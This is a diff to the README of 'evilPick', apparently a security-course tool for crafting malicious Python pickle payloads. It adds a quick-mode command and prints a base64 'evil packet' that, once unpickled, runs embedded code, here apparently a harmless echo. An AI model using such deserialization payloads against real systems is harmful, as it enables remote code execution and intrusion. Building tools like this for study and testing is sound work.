@@ -62,6 +62,19 @@ Y3R5cGVzCkZ1bmN0aW9uVHlwZQooY21hcnNoYWwKbG9hZHMKKGNiYXNlNjQKYjY0ZGVjb2RlCihTJ1l3
 ___________________________________________________________
 [^] Do you want to save it? (y/n, leave to skip):  n
 ```
+running evilPick in quick mode providing : example.py (source code), encode schema base64 and destination file 
+```sh
+python evilPick.py -f example.py -e base64 -s new_exploit
+___________________________________________________________
+[*] Crafted Evil Packet: 
+
+Y3R5cGVzCkZ1bmN0aW9uVHlwZQooY21hcnNoYWwKbG9hZHMKKGNiYXNlNjQKYjY0ZGVjb2RlCihTJ1l3QUFBQUFCQUFBQUFnQUFBRU1BQUFCekhRQUFBR1FCQUdRQUFHd0FBSDBBQUh3QUFHb0JBR1FDQUlNQkFBRmtBQUJUS0FNQUFBQk9hZi8vLy85ekVBQUFBR1ZqYUc4Z1NHVnNiRzhnVjI5eWJHUW9BZ0FBQUhRQ0FBQUFiM04wQmdBQUFITjVjM1JsYlNnQkFBQUFVZ0FBQUFBb0FBQUFBQ2dBQUFBQWN3Z0FBQUE4YzNSeWFXNW5QblFEQUFBQVptOXZBUUFBQUhNRUFBQUFBQUVNQVE9PScKdFJ0UmNfX2J1aWx0aW5fXwpnbG9iYWxzCih0UlMnJwp0Uih0Ui4=
+
+___________________________________________________________
+[*] Writing it in new_exploit
+
+__________________________Job_Done_________________________
+```
 
 ### Author
 Lacerenza Francesco - Systems and Networks Security 
